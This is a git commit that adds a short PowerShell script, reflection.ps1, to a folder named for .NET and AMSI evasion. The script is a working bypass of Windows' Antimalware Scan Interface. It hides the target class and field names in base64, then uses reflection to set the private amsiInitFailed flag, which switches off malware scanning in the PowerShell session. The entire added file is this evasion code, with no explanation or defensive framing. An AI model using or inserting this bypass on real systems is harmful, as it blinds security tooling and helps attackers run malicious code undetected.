d4e93855eda85abb81b4ba89d105025ea529e8ee
k3vinwvng <98243321+k3vinwvng@users.noreply.github.com>
2022-01-22 20:28:44 -0500

    Create reflection.ps1

---
+++ Evasion/.NET/AMSI/reflection.ps1
@@ -0,0 +1,12 @@
+function b64decode
+{
+    param ($encoded)
+    $decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
+    return $decoded
+}
+
+$1 = b64decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
+$2 = b64decode("YW1zaUluaXRGYWlsZWQ=")
+$3 = b64decode("Tm9uUHVibGljLFN0YXRpYw==")
+
+[Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true)
